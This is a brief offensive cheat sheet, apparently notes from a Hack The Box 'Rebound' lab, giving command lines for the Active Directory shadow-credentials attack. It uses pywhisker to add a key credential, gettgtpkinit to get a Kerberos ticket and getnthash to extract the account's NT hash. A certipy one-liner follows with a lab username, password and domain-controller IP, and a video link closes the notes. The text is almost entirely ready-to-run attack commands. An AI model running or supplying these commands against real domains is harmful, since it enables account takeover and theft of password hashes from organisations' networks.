




```
# Setup shadow creds
pywhisker.py -d "FQDN_DOMAIN" -u "USER" -p "PASSWORD" --target "TARGET_SAMNAME" --action "add"

# Pass the Certificate
gettgtpkinit.py -cert-pfx "PATH_TO_PFX_CERT" -pfx-pass "CERT_PASSWORD" "FQDN_DOMAIN/TARGET_SAMNAME" "TGT_CCACHE_FILE"

# Unpac The Hash
export KRB5CCNAME="TGT_CCACHE_FILE"
getnthash.py -key 'AS-REP encryption key' 'FQDN_DOMAIN'/'TARGET_SAMNAME'
```


or automatic way

```
certipy shadow auto -account winrm_svc -u "oorend@rebound.htb" -p '1GR8t@$$4u' -dc-ip 10.10.11.231 -k -target dc01.rebound.htb
```








https://youtu.be/a97PMfOXitY